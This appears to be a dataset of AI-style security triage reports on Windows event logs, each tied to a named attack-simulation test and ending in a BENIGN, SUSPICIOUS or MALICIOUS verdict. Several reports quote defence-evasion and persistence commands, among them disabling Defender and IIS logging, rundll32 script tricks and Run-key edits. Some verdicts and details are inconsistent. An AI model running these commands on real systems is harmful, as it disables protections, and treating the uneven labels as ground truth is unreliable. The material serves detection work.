### Threats and Risks Identified

- **Potential Compromise:** The exhibited behaviors indicate that the system may be compromised with malware trying to establish or maintain persistence.
- **Privilege Escalation:** The UAC bypass method exists a high risk for privilege escalation attacks which can lead to further system compromise.
- **System Stability/Integrity Risks:** Modifying high-profile entries such as registry keys and environment variables can lead to instability and unintended changes in system behavior.

## Guidance on How to Proceed

1. **Immediate Isolation:** Isolate the affected system to prevent potential lateral movement within the network.
2. **Forensic Analysis:** Conduct a full forensic analysis on the system to track the origin and execution path of the suspicious DLL file and corresponding scripts.
3. **Reverse Engineering:** Analyze the suspicious DLL and scripts for any payloads or malicious behavior.
4. **Review and Clean Registry & Environment Variables:** Revert suspicious changes to registry keys and environment settings.
5. **UTHOAC and Patching:** Ensure UAC mechanisms are secure and operating effectively. Patch any identified vulnerabilities that could facilitate such privilege escalations.
6. **Monitor and Update Security Measures:** Enhance monitoring through EDR solutions and update antivirus/malware definitions to catch similar threats in the future.

### Final Resolution
- **Resolution: MALICIOUS**  
The activity within these logs is indicative of a deliberate and malicious attempt at system compromise, possibly by utilizing advanced techniques to bypass security controls and achieve privilege escalation. It is imperative to treat this as a security incident and respond accordingly."
Disable Windows IIS HTTP Logging,"After reviewing the provided Windows event logs, several observations were made:

1. **Process Execution Patterns**:
   - Frequent invocations of native utilities like `hostname.exe`, `whoami.exe`, and `wevtutil.exe` can be considered normal but may also indicate reconnaissance if triggered together and frequently outside of typical user behavior. Such utilities were executed several times in quick succession.

2. **Privilege Escalation and Anomalous PowerShell Activity**:
   - A suspicious command was executed using PowerShell: `""powershell.exe"" & {C:\Windows\System32\inetsrv\appcmd.exe set config \""Default Web Site\"" /section:httplogging /dontLog:true}`. The intention to modify HTTP logging to not log data may indicate a potential effort to cover tracks, which is unusual and warrants further investigation.

3. **Log Clearing or Alteration**:
   - Execution of `wevtutil.exe` is notable as it can be used to alter or delete event logs, which might indicate an attempt to tamper with logs to cover malicious activities.

4. **Time Change**:
   - Time changes (`EventID 4616`) initiated by `svchost.exe` under `LOCAL SERVICE` account were logged. While such events could be benign system adjustments, they could also be indicative of tampering, particularly if associated with other suspicious activities.

5. **Service and Update Executions**:
   - Multiple entries related to Microsoft Edge Update processes running under `NT AUTHORITY\SYSTEM`. While this could be normal if correlated with routine updates, the numerous and varying contexts in which the executables appear (evidenced by different paths such as `Temp` directories) could be checked against known good states and update schedules to ensure they are part of a legitimate update process.

Based on the analysis of the provided event logs, the following conclusion can be drawn:

**Conclusion: SUSPICIOUS**

The logs exhibit some suspicious activities, particularly the execution of PowerShell scripts aiming to change logging configurations, the frequent use of potentially benign utilities like `whoami.exe` in a way that could indicate reconnaissance, and the execution of `wevtutil.exe` which could denote an attempt to manipulate event logs. While these could occasionally occur in benign administrative tasks, the volume and nature necessitate further investigation to rule out malicious intent, especially considering the logs originated from a high-profile machine (the CEO's).

**Guidance on How to Proceed**:
- Thoroughly review the context of these operations, including any associated user actions and timings.
- Investigate if any unauthorized changes were made to system configurations or event logs.
- Analyze network logs and other endpoint telemetry (if available) to track origin and potential intent.
- Update and review the host's software and security configurations, ensuring it aligns with latest best-practices and policies.
- Consider enhanced monitoring of the CEO's machine and potentially conduct a more in-depth forensic investigation to rule out compromise.
"
DLL Side-Loading using the Notepad++ GUP.exe binary,"**Analysis of the Provided Windows Event Logs**

In reviewing the provided logs from a Windows host, my primary focus is to identify potential indicators of malicious activity, privilege escalation, unusual process creation, suspicious command-line arguments, or any anomalies that deviate from expected behavior.

### General Observations:
- The logs highlight several processes involving typical administrative and software installation activities. Processes such as `powershell.exe`, `cmd.exe`, and `wevtutil.exe` are often seen in legitimate administrative tasks, but they also pose a risk as common vectors for exploitation by malicious actors.
- The execution of `MicrosoftEdgeUpdate.exe` and related Edge Update processes is routine for system updates, but excessive activity related to these processes, especially involving temporary directories, can raise concerns regarding trojanized updates or overzealous update services.

### Specific Findings and Context:
1. **PowerShell and Other Command Executions:**
   - We observe `powershell.exe` being executed by `SERVER002\admin_test` at a high integrity level. Without specific command-line input, the context is unclear. However, PowerShell is a powerful tool that can be used for both legitimate and malicious purposes.
   - Frequent instances of `wevtutil.exe` are also observed. While often used for querying event logs, if combined with PowerShell or seen with suspicious command-line options, it might indicate log tampering.

2. **Unusual File Paths:**
   - The execution of `GUP.exe` from a temporary path (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\GUP.exe`) is concerning. Temporary directories are generally used for short-lived or transient files and can be leveraged for executing malicious files without leaving a trace.
   - The file `GUP.exe`, associated with Notepad++ updates, might be benign. However, its presence in a temporary path, executed via a command prompt, needs further investigation to confirm its authenticity.

3. **Edge Update Processes:**
   - Extensive activity involving `Microsoft Edge Update` processes follows a typical update pattern. Though active processes from temporary directories (`EUE351.tmp`) are slightly unusual, they might relate to installation mechanics specific to Edge's update logic.
   - Without direct evidence of malicious manipulation or unexpected process-spawning from these updates (beyond their extensive nature), they appear compatible with aggressive update deployment or installation procedures.

4. **General System Behavior:**
   - Trusted system processes such as `sppsvc.exe` (Software Protection Platform Service), `wbem\\WmiPrvSE.exe` (WMI Provider Host), and `TrustedInstaller.exe` were observed running under `NT AUTHORITY\SYSTEM`. Their execution is part of regular system operations but might warrant further review to assure non-rogue use.

### Resolution:
**SUSPICIOUS**

The activity noted, particularly the execution of `GUP.exe` from a temporary path and extensive Microsoft Edge Update logs, suggests behavior that is not conclusively benign nor evidently malicious. This warrants a closer inspection of the associated files and accounts - particularly reviewing hash values against known threat databases and a closer examination of the temporary path activities.

### Next Steps:
1. **Hash Verification:** Cross-reference hashes of `GUP.exe` and associated executables within the temporary directory against known malware databases (e.g., VirusTotal).
2. **Review Update Procedures:** Verify Microsoft Edge's update service and any Edge setup components against legitimate versions.
3. **Enhanced Monitoring:** Increase monitoring of PowerShell activity and examine scripting logs to capture command-line inputs for signs of escalating privilege or unusual task execution.
4. **Identify User Activities:** Corroborate `admin_test`'s activities with scheduled tasks, login times, and direct user-verification if possible for unauthorized configurations or access patterns."
Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,"Based on the evaluation of the provided Windows event logs, we will focus on the key indicators of potentially suspicious or malicious activity. Here is the analysis of the logs:

### Analysis:

1. **Windows PowerShell Logs**:
   - Multiple PowerShell commands were executed to disable Windows Defender features using `Disable-WindowsOptionalFeature`, including ""Windows-Defender-Gui"", ""Windows-Defender-Features"", ""Windows-Defender"", and ""Windows-Defender-ApplicationGuard"". These features were disabled with `-NoRestart` and `-ErrorAction Ignore` flags.
   - Disabling security features, particularly those related to an antivirus product, is often aligned with malicious activity, as attackers may attempt to hinder detection or prevent interference with malicious processes.

2. **Sysmon Logs**:
   - Numerous references to `Sysmon EventID 1` and `EventID 5`, which relate to the process creation. The processes include instances of `wevtutil.exe` and `conhost.exe`, executed by user ""SERVER002\\admin_test"". While not inherently malicious, they were executed within the same timeframe as the suspicious PowerShell activities.
   - Notably, there are several `DismHost.exe` processes executed from atypical temporary directories. This may warrant further investigation as it can sometimes be associated with unauthorized modifications to system features.

3. **Application Logs**:
   - These mostly contain routine log entries from Microsoft Edge Update, indicating service start and stop events. The `MicrosoftEdgeUpdate.exe` seems to perform various updates, a typical behavior for browser update mechanisms.

4. **System Logs**:
   - The system log information was not provided; however, significant insights often come from these, such as driver installations, system state changes, or errors.

5. **Security Logs**:
   - The security logs information was absent from this subset, which would normally capture authentication events, account management, or policy changes.

### Assessment:

- The repeated disabling of Windows Defender features through PowerShell, observed immediately around the same timestamp, is the primary indicator of suspicious behavior. This kind of action is seldom performed by legitimate software without user awareness, especially on a high-profile account such as the CEO's.
- Additional process creation logs (`DismHost.exe` from temporary folders) suggest potential activities that should not be routine and could mean unauthorized system changes or preparations for further compromises.

### Conclusion:
Given these findings, the activity observed is classified as **MALICIOUS**. The disabling of security defenses without a clear and valid reason implies that the actions taken could pave the way for further exploitation or persistence mechanisms.

### Guidance:
1. **Immediate Action**:
   - Re-enable Windows Defender features immediately.
   - Isolate the CEO's machine from the network to prevent potential lateral movement.
   - Begin a thorough forensic analysis of the machine to identify additional malicious artifacts or backdoors.

2. **Further Actions**:
   - Verify the integrity of machine and network defenses; scan for any signs of compromise on related systems.
   - Inform the CEO and relevant stakeholders of the potential security incident.
   - Review administrative accounts for other unauthorized activities or privilege escalations.
   - Consider engaging with cybersecurity incident response experts if required to ensure a comprehensive mitigation and clean-up process."
Install root CA on Windows,"### Analysis of Windows Event Logs

#### Security Log Analysis

1. **Event ID 4624 (Logon Events):**
   - **Repeated occurrences** of Event ID 4624 with Logon Type 5 indicate system logons, typically related to the startup of services. Logon Type 5 activity is generally benign unless it is associated with unusual circumstances or accounts.
   - **Execution through `Advapi` and authentication via `Negotiate`** are typical for service accounts or SYSTEM processes.

2. **Event ID 4672 (Special Privileges Assigned):**
   - This event indicates that special privileges were assigned to a user. The SYSTEM account is being assigned several high-level privileges (`SeDebugPrivilege`, `SeTcbPrivilege`, etc.), which is standard behavior for SYSTEM processes. However, this would be anomalous if these privileges were assigned to a non-SYSTEM user.

3. **Event ID 5379 (Credential Validation):**
   - Multiple instances of Event ID 5379 are attempting to access Microsoft and Windows Live credentials but result in a `ReturnCode` of 3221226021, indicating a failed attempt. This return code corresponds to a denied access, which could indicate that a service or process is trying to access credentials it should not be accessing.

#### Sysmon Log Analysis

1. **Powershell Activity:**
   - **PowerShell Execution**: Detected instance of PowerShell running with the command to import a certificate (`Import-Certificate -FilePath rootCA.cer`). This activity might not be typical for routine operations and could indicate an attempt to install or trust a new root certificate, potentially malicious if not an administrative task.
 
2. **Process Creation Events (ID 1 and 5):**
   - **Frequent and rapid succession of processes**: `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and others indicate manual or automated administrative tasks occurring. The enumeration processes like `hostname.exe` and `whoami.exe` are often used by attackers for reconnaissance.
   - Wevtutil.exe is a logging utility, which might be used here to clear event logs, behavior that can be associated with malicious activities.

3. **Rundll32 Activity:**
   - Observed execution of `rundll32.exe`, though no clear malicious intent based on the command line (`PcaSvc.dll,PcaPatchSdbTask`), rundll32 can be misused by attackers to execute potentially malicious DLLs.

#### Application & System Log Analysis

- **Windows Updates & Service Configurations**: 
  - A number of events related to Windows Update services, Microsoft Edge updates, and Windows service management (`svchost.exe`, `sc.exe`) could be typical but warrant checking against known system maintenance schedules.

#### PowerShell Log Analysis

- The PowerShell logs confirm the command involving `Import-Certificate`, which should be reviewed in detail to ensure it aligns with legitimate administrative tasks. The command line observed attempts to move a certificate to the trusted root store, which could be a tactic used to establish persistence or later allow malicious communications to appear legitimate.

### Assessment

- **Suspicious Activity Detected**: 
    - The anomalous PowerShell activity attempting to install a root certificate is suspicious and warrants further investigation.
    - The failed access attempts of credentials could indicate probing for weaknesses or improperly configured services attempting data access.

### Resolution

- **Resolution**: **SUSPICIOUS**
  - The detected activity could be standard for administrative procedures if the operations were scheduled or approved by IT. However, without clear confirmation, these actions could indicate a potential compromise.
  
### Guidance

- **Immediate Actions:**
  - Validate whether the PowerShell and `rundll32.exe` activities align with normal administrative tasks or scheduled updates.
  - Investigate the source or initiator of the PowerShell scripts, particularly the importation of certificates.
  - Review user account (`admin_test`) activity for any inconsistencies or unauthorized access.
  
- **Further Investigation:**
  - Conduct a thorough review of system security policies and user permissions.
  - Monitor for subsequent abnormal behavior or additional attempts to access or modify system configurations.
  - Review firewall and network logs for any unusual outbound connection attempts, particularly those that deviate from known safe certificates."
Kill antimalware protected processes using Backstab,"Based on the provided logs, here is a detailed analysis focusing on the suspicious activities that might indicate potential malicious activity:

1. **Powershell Activity**:
   - The invocation of `powershell.exe` with a suspicious command line: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script64.exe"" -k -n MsMpEng.exe` is evident.
   - The use of PowerShell to launch executables from the Temp directory is often associated with malicious behavior as it is a common method for malware to execute scripts or binaries that were downloaded or extracted temporarily.

2. **Executable from Temp Directory**:
   - The execution of `script64.exe` from what looks like a temporary path is concerning. This file is not in a typical program files or system files location and could indicate it was placed temporarily for malicious purposes.

3. **Use of System Utilities**:
   - The `wevtutil.exe` and `hostname.exe` tools in the logs appear multiple times, which might suggest an attempt to manipulate logs or gather system information stealthily.
   - `whoami.exe` is also executed; a common tool for an attacker to confirm access levels after gaining access.

4. **Console Host Process (`conhost.exe`)**:
   - Numerous executions of `conhost.exe`, especially in association with PowerShell and other tools, suggest that these console hosts are being utilized in potentially malicious activities, possibly as part of the investigation or manipulation of processes.

5. **Edge Update Activities**:
   - While there are multiple logs related to Microsoft Edge Update, appearing under `NT AUTHORITY\\SYSTEM`, which is relatively normal, no directly malicious activity is indicated here.

**Assessment of the Situation**:
- The key area of concern is the invocation of PowerShell with a suspicious command line potentially executing a script from a temporary directory. This is a typical indicator of initial compromise or ongoing exploitation activities in a system.

**Resolution**: 
- **MALICIOUS**: The detailed analysis identifies behaviors consistent with malware execution through PowerShell and executable files in temporary directories. These are strong indicators that the system may have been compromised, and actions should be taken immediately to contain any potential threat.

**Guidance on How to Proceed**:
1. **Immediate Containment**: Disconnect the affected machine from the network to prevent further potentially malicious actions.
2. **In-Depth Malware Analysis**: Conduct further investigation on `script64.exe` to identify its nature and source.
3. **Root Cause Investigation**: Check for additional indicators of compromise, other dropped files, or network artifacts.
4. **Implement Security Measures**: Strengthen security policies around script execution, especially from non-standard directories like the Temp folder. Enable script logging if not already configured.
5. **Patch and Update**: Ensure all systems are updated with the latest security patches.
6. **User Awareness**: Inform the users, especially the admins, about spear-phishing attacks or social engineering that might have led to this compromise.

This assessment and guidance should help mitigate the identified security threat effectively."
Execution of non-dll using rundll32.exe,"Upon analyzing the provided Windows event logs, I have identified several areas of interest and activity that warrant further discussion.

### Suspicious Activities Identified:

1. **PowerShell Execution with Unusual Command:**
   - The PowerShell logs indicate a command execution using `rundll32.exe` with a non-standard file (`C:\Users\$env:username\Downloads\calc.png`). Typically, `calc.png` implies an image file, but here it's being used with `rundll32.exe` to initiate a function `StartW`. This is indicative of a potential abuse of `rundll32.exe` to execute code from a non-standard or malicious DLL or similar payload hidden within an image file, which is a known technique to evade detection.

2. **Privilege Escalation and Sensitive Privileges Granted:**
   - The Security log shows an event (ID 4672) where the system account `NT AUTHORITY\SYSTEM` is granted a wide range of sensitive privileges. While this might align with legitimate system operations, it is noteworthy in the context of current operations and activities.

3. **Time Change Events:**
   - System logs indicate multiple time-change events (`EventID 24` and `EventID 1`). While the time change can occur for legitimate reasons, it can also be an attempt by an attacker to manipulate timestamps to cover tracks. However, there’s no direct indication from these logs that suggest malicious intent strictly from these events alone.

4. **Edge Update Executions:**
   - Sysmon logs show extensive logged activity involving Microsoft Edge Update processes. This could be normal if there has been a recent system update or installation of Edge. However, the volume and rapid sequence of these executions could also hint at potential misuse or tampering, especially if no updates were expected or scheduled.

### Conclusion:

The key concern in these logs is the misuse of PowerShell to execute a command through `rundll32.exe` with an image file (`calc.png`) and a function `StartW`. This is a significant indicator of potential malicious activity given the known tactics of exploiting utilities like `rundll32.exe` to mask malicious execution. 

### Assessment and Resolution:

Based solely on the logs provided, the behavior surrounding PowerShell and `rundll32.exe` suggests potential malicious activity. While other activities such as time changes and Edge updates might generally be benign, in the context of the identified PowerShell command, they could be contributing to suspicious behavior or be unrelated normal activities.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Analysis and Containment:**
   - Investigate the origin and creation of `calc.png` to determine if it contains malicious payloads.
   - Analyze network connections during and after the PowerShell execution for signs of data exfiltration or command-and-control traffic.
   - Isolate the affected system (""Server002"") for deeper forensic analysis to prevent potential lateral movement.

2. **Validation of Privileges:**
   - Review privilege escalations and sensitive rights granted during this period to ensure they are justified and expected.

3. **System Audit and Recovery:**
   - Conduct a comprehensive audit of scheduled tasks, startup entries, and running processes for other signs of compromise or persistence mechanisms.
   - Apply necessary patches and review security policies to strengthen defenses moving forward.

4. **Threat Intelligence and Monitoring:**
   - Increase monitoring on this and related systems for unusual behavior and log additional suspicious PowerShell activities.
   - Cross-reference observables such as file hashes, command syntax, or IP addresses with threat intelligence to identify known malware or adversary tactics. 

This combination of actions will help mitigate potential threats and prepare for any further malicious activities."
Activate Windows NoDesktop Group Policy Feature,"Upon analyzing the given Windows event logs, here are the key observations and findings:

1. **Windows Defender Status**: An event from the ""SecurityCenter"" indicates that Windows Defender is active and running (SECURITY_PRODUCT_STATE_ON). This suggests that antivirus measures are in place.

2. **Edge Update Activity**: There are several entries related to Microsoft Edge Update processes. These entries indicate the installation and registration of updates, as seen in the Sysmon logs. While these processes originated from legitimate Microsoft sources, they are noted for their frequency and execution context under `NT AUTHORITY\SYSTEM`. Unless specific concerns arise about potential tampering or an unusual number of such updates, these appear regular.

3. **Kernel Events and Time Changes**:
   - Several Kernel-General events show time changes on the system, with both forward and backward adjustments noted. These changes could suggest manual intervention, a synchronization issue, or malicious tampering. The involvement of the service `svchost.exe` doesn't directly imply maliciousness, but time manipulation can be a tactic used in attacks to obfuscate logging or audit trails.
   - Associated Security log entries indicate time changes done by `svchost.exe` with the `LOCAL SERVICE` account, which might be standard behavior but requires scrutiny given the context.

4. **PowerShell & Sysmon Logs**:
   - No suspicious PowerShell activities are logged, a common vector in many attacks.
   - Sysmon logs document several process executions including transitions of processes like `whoami.exe`, `cmd.exe`, and usage of `reg.exe` for modifying the registry (`NoDesktop` policy change). This registry modification particularly stands out as potentially suspicious because desktop restriction policies are often leveraged in malware attacks to lock users out.

5. **Potential Malicious Indicators**:
   - The command execution using `cmd.exe` to alter registry settings (`NoDesktop`) is very conspicuous. Changing desktop policies directly via the command line without a visible appropriate administrative context (change records or user intervention) could indicate attempts at user profiling, privilege escalation, or persistence mechanisms.

### Conclusion:

Based on the analysis, these logs contain elements that warranted further investigation, especially around the registry manipulation done by `cmd.exe`. Although there are benign explanations for some of the scenarios, the combination and sequence of activities, particularly related to time modification and registry edits under high integrity or system levels, warrant cautious evaluation.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Further investigation is needed, particularly focusing on the context and intent behind the registry modification and the time alterations.
- Review any associated user activity or alerts during the time these events occurred.
- Examine subsequent behavior closely for additional patterns or potential escalation.
- Ensure that the system is secure and evaluate whether additional monitoring or scans are necessary for assurance."
Windows Modify Show Compress Color And Info Tip Registry,"Based on the provided Windows event logs, I have conducted an analysis focusing on identifying any indicators of malicious activity. Here are my findings:

### Analysis of Windows Event Logs:

1. **PowerShell Logs**: The section is blank, indicating no logs were provided or no PowerShell activity occurred during the time frame.

2. **Application Logs**:
   - The application logs indicate that the `edgeupdate` service stopped multiple times. This is a normal behavior for an updating service and does not directly point to malicious activity.
   - The `Microsoft-Windows-Security-SPP` log entry is related to the Software Protection Platform and shows routine activity.

3. **System Logs**:
   - The `Microsoft-Windows-Time-Service` is using `time.windows.com` as the time source. This is normal for Windows time synchronization.

4. **Sysmon Logs**:
   - Frequent use of `wevtutil.exe` by the `admin_test` user suggests log enumeration, likely for administrative purposes.
   - Execution of `whoami.exe` and `hostname.exe` under the `admin_test` account indicates commands are being run to gather system and user information. This could be part of routine administrative activities.
   - A registry modification was attempted through `cmd.exe` and `reg.exe`, altering Explorer settings. While the changes are subtle, unusual registry modifications can sometimes indicate policy changes by malware. However, these modifications are related to UI settings and are not immediately indicative of malicious intent.
   - `MicrosoftEdgeUpdate.exe` processes observed running various tasks with the NT AUTHORITY\SYSTEM account, including updates and COM registration. Such activities are expected for an edge update process.

5. **Security Logs**: Not provided or empty, indicating either no specific records matching this time frame or focus areas or no security events logged.

### Assessment:

There is a mixture of routine administrative and service activities, such as checking user/host information and service updates, without clear evidence of escalation or unauthorized actions. The observed behavior primarily involves tools and processes typically used during software updates and normal system administration.

### Resolution:
- **Resolution: BENIGN**

### Guidance:
- **Follow-up**: Although this analysis flags the logs as benign, maintaining vigilance for any unexpected changes is crucial. Ensure regular audits of administrative actions and software updates.
- **Monitoring**: Continue to monitor the system for any changes or unusual patterns, and ensure thorough logging across PowerShell, System, and Security logs for comprehensive future analysis.
- **Awareness**: Reinforce to administrative users best practices regarding log reviews and prompt reporting anomalies for further investigation. 

The observed activities align with expected behavior and do not explicitly indicate malicious activity based on available information and context."
Modify Registry of Local Machine - cmd,"**Analysis:**

The given logs span events on ""Server002"" and involve several system processes, mainly focusing on processes involving system utilities and Microsoft Edge Updates. The events provide detailed information on process execution, including process creation and terminations.

**1. System Activity:**
   - **svchost.exe:** This is a standard host process for services managed by DLLs in Windows, and its presence alone does not indicate malicious activity unless it is operating from a non-standard path or exhibiting suspicious behavior. The logs show svchost.exe performing time adjustments, which is a routine operation.
   - **Local Time Changes:** The security and system logs indicate multiple time change events by the svchost.exe process which are controlled by the LOCAL SERVICE account. This behavior matches normal system operations related to Windows time synchronization services.

**2. Suspicious Activity:**
   - **Command Execution:** A `cmd.exe` process was executed with a command to add a registry key under `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` to execute `calc.exe`. The alteration of the registry to execute `calc.exe` on startup is suspicious because it indicates an attempt to maintain persistence, typically seen in malware operations.
   - **wevtutil.exe executions:** There are several instances of `wevtutil.exe` followed by `conhost.exe` logged. While `wevtutil.exe` is a legitimate command-line tool to retrieve event logs, frequent or unexpected usage, especially in rapid succession by a user account (SERVER002\admin_test) may indicate log tampering or data exfiltration attempts, which warrants further investigation.
   - **Process Integrity Level:** The logs show processes being run at high integrity levels, which implies processes with elevated privileges are being executed. While some operations like edge updates are legitimate, elevated privilege processes tying back to registry and process launches from command line flags indicate potential privilege misuse.

**3. Application Logging:**
   - The application logs show EdgeUpdate services stopping, which is expected during update operations. However, the volume and replication across multiple directories including temp folders might indicate non-standard updates or potential tampering.

**Assessment:**
- **These logs show suspicious activity primarily around manual persistence methods and the unexpected use of system utilities. There are no explicit signatures of known malware but suspicious modifications and command executions suggest further inspection.**

**Resolution: SUSPICIOUS**

**Guidance on Further Actions:**
- **Investigate the `cmd.exe` invocation and registry alterations:** Utilize tools to check the integrity of the registry and determine the source of the command that initiated the persistence mechanism change. Verify with the system owner (administrator or user) if this was an intended change.
- **Analyze `wevtutil.exe` Usage:** Determine the necessity and frequency of its usage in context with user activity logs, possibly enabling additional auditing.
- **Contain and Monitor:** Isolate the affected system for further forensic analysis. Deploy endpoint detection mechanisms focusing on registry changes, command line detections, and execution vectors.
- **User Education:** Inform users involved (SERVER002\admin_test) of policies regarding elevated privilege usage and ensure that no credentials or access is shared. Reset and secure privileged accounts as a precaution."
Indirect Command Execution - pcalua.exe,"Upon analyzing the provided log entries, here is a detailed breakdown of the potential issues and my final assessment:

1. **Process Execution Patterns:**
   - We observe a sequence of process executions such as `hostname.exe`, `whoami.exe`, and `calc.exe` being run under the user ""SERVER002\\admin_test"".
   - The processes `cmd.exe`, `pcalua.exe`, and multiple instances of `calc.exe` are indicative of a sequence of operations that might relate to testing or script execution.

2. **Command-Line Arguments:**
   - The command `cmd.exe /c pcalua.exe -a calc.exe & pcalua.exe -a C:\\Windows\\System32\\calc.exe` appears to open the calculator application. This is unusual as it chains commands in a manner typically used by scripts or automation processes.

3. **Process Integrity Levels:**
   - The processes are running with high integrity, which indicates administrative privileges. This suggests that the user ""admin_test"" might have elevated privileges or be operating in an administrative context.

4. **Event Logging:**
   - The frequent execution of `wevtutil.exe`, a tool used for managing Windows Event Logs, could be benign if used for log management or auditing purposes. However, frequent use might suggest attempts at log manipulation.

5. **Indicators of Malicious Activity:**
   - The execution of benign tools (`whoami.exe`, `hostname.exe`, `calc.exe`) can be leveraged in malicious attacks (e.g., living-off-the-land binaries).
   - However, there are no direct indicators of malware or compromise, such as unusual processes, non-standard system paths, or known malware command-line arguments.

6. **Network and Service Indications:**
   - Legitimate service processes such as `MicrosoftEdgeUpdate.exe`, `sppsvc.exe`, and others show typical behavior for system service operations.
   - The EDR alert on the CEO’s machine raises questions, but based solely on the logs provided, there is no explicit indication of compromise.

**Final Assessment:**
The activities logged predominantly involve legitimate system operations and utility executions. While the chaining of commands through `cmd.exe` and high-frequency use of certain utilities could hint at potential misuse, they are not conclusively indicative of malicious activity based on the logs alone. Additional context from security alerts or user activity would be beneficial.

**Resolution: SUSPICIOUS**
This activity is flagged as suspicious due to the unusual process sequences and elevated privileges. It requires further investigation, such as checking user intent, reviewing additional alerts on the EDR, and examining network activity logs to determine whether these actions are a part of routine administration or potentially malicious script execution."
Disable Win Defender Notification,"Upon reviewing the provided logs from the System, Sysmon, Application, and Security events, several key points can be identified:

1. **System Log**:
   - Multiple time changes are mentioned with `svchost.exe` involved, but the changes are minor and likely part of regular time synchronization operations via services such as the Windows Time Service. These entries are typical and not immediately indicative of malicious activity.

2. **Sysmon Log**:
   - Observations include multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. The usage of `wevtutil.exe` could imply potential infiltration activity since this tool is typically used for event log management and can be used by attackers to clear events. However, without further context or evidence of improper configuration commands or output, this alone is not definitively malicious.
   - There is a noticeable execution of `cmd.exe` being used to modify Windows Defender Security notifications via registry edits (`reg add` command). This action is concerning as it indicates an attempt to disable security notifications, which often is a part of attack methodologies to reduce the visibility of malicious actions.
   - Sequentially related processes, like the command `whoami.exe`, `hostname.exe`, and registry modification through `reg.exe`, may be indicative of exploration or configuration change activity, typically used in unauthorized access scenarios.

3. **Application Log**:
   - Entries regarding the stoppage of `edgeupdate` services, which can be expected during updates or maintenance, do not directly indicate malicious behavior. However, they could be used in combination with other actions to interrupt legitimate services.

4. **Security Log**:
   - Event ID 4616, which involves a change in the system time, occurs twice with `svchost.exe`. As mentioned earlier, this could be linked to regular time sync operations but should be watched, particularly if seen without apparent authorized maintenance or administrative actions.

### Conclusion:
The most alarming element in this investigation is the usage of command-line instructions to disable Windows Defender Security Center notifications. While this isolated action can be part of administrative tasks, in the context presented without proper administrative need, it could be indicative of a malicious intent to reduce system defenses and therefore requires further investigation.

### Resolution:
- **SUSPICIOUS**: The activity within the logs suggests potentially unwanted actions, particularly with the Windows Defender notification modification and frequent usage of `wevtutil.exe`. Further investigation is warranted to determine if these actions were authorized, ideally involving checks on recent administrative actions on this system, exploration of logs for additional context, and considering deploying further monitoring to the system for suspicious operations.
  
Investigation steps should include examining who initiated these commands and why, assessing if there were any unauthorized access points, and confirming any legitimate needs for these actions, particularly involving security policy alterations."
Javascript in registry,"### Detailed Analysis

The provided logs contain multiple entries that warrant further investigation to determine if any malicious activity has occurred on the server identified as ""Server002"". Below is a detailed breakdown of the logs:

#### Windows PowerShell Log Analysis
- **Command Execution:** 
  - The PowerShell logs indicate an attempt to modify the registry with the command: `powershell.exe & {New-ItemProperty ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" -Name data -Value ""<script>""}`.
  - This command attempts to create or modify a registry entry adding a script tag, which is typically associated with attempts to execute scripts that can manipulate internet settings or perform malicious activities like script injection.

#### Sysmon Log Analysis
- **Process Creation:**
  - Multiple processes related to Microsoft Edge Update and `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are logged.
  - Notably, `powershell.exe` (ProcessId 5412) was launched with the same risky command highlighted in the PowerShell logs.

#### System Log Analysis
- **Time Manipulation:**
  - The logs indicate changes to the system time by `svchost.exe`. Registered system time was set back by several seconds. While this could potentially align with network time protocol (NTP) adjustments, it is worth verifying the legitimacy and necessity of such changes.

#### Application Log Analysis
- **Service Actions:**
  - Microsoft Edge Update service starting and stopping are logged, consistent with normal operation but repetitive actions without a discernible pattern should be further observed.

#### Security Log Analysis
- **Logon Events:**
  - There are records of privileged logons (Event ID 4672) involving the user ""admin_test"" with a comprehensive list of privileges including `SeDebugPrivilege`, indicating elevated access which if misused, poses a significant security risk.

### Assessment and Recommendation

- **Suspicious Activity Detected:** The combination of attempts to alter registry settings in a manner often associated with malicious intent, especially involving script tags, alongside the executing context of PowerShell, indicates suspicious behavior. The registry changes do not align with typical benign administrative tasks and should be further scrutinized. 

- **Insufficient Data for Malicious Activity Confirmation:** While these actions are typically suspicious and could indicate a compromise, definitive proof of malicious intent or data compromise is not apparent from the events alone. Further analysis is required, including investigating the context for these changes, network activity analysis, and checking for any additional signs of compromise, such as lateral movement or data exfiltration attempts.

#### Final Resolution: **SUSPICIOUS**

### Guidance on How to Proceed
1. **Investigate the Origin:** 
   - Determine the source and intent of the PowerShell command execution. Analyze the user account ""admin_test"" activities around the same timeframe.
2. **Check for Additional Indicators:**
   - Look into other hosts or devices attempting similar suspicious activities, focusing on any connections to/from ""Server002"".
3. **System Hardening:**
   - Validate and tighten access controls for PowerShell usage and monitor for deviations from baseline behavior.
4. **Forensic Analysis:**
   - Consider a deeper forensic analysis of the affected machine including memory analysis for transient threats.

Rundll32 execute VBscript command using Ordinal number,"### Analysis of Windows Event Logs

**Sysmon Log**

1. **Executes &mdash; MicrosoftEdgeUpdate.exe:** 
   - Multiple processes related to Microsoft Edge Update (e.g., `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, etc.) and related installations are present through various command lines.
   - These processes primarily show activities like updates, configurations, installing commands line arguments associated with updates. No direct indicators of malicious scripting like `cmd` or `rundll32` exploitation are noted for these components.

2. **Suspicious Command Sequence:** 
   - A specific command line involved `cmd.exe /c rundll32 vbscript:""\\..\\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)` is evident. This is indicative of a potential malicious activity or payload execution attempt leveraging a `rundll32` and `vbscript` based technique, leading to the launch of `calc.exe`. This scenario matches known attempts to exploit vulnerabilities using scriptable controls.

3. **Whoami.exe Execution:** 
   - Series of events involving `whoami.exe` depict probable user information enumeration, which is a common phase seen in a lateral movement or reconnaissance activity.

**System Log**

- Contains time synchronization events via `time.windows.com` which are typical and expected behavior for time service maintenance.
- No outstanding anomalies found in the system log entries.

**Security Log**

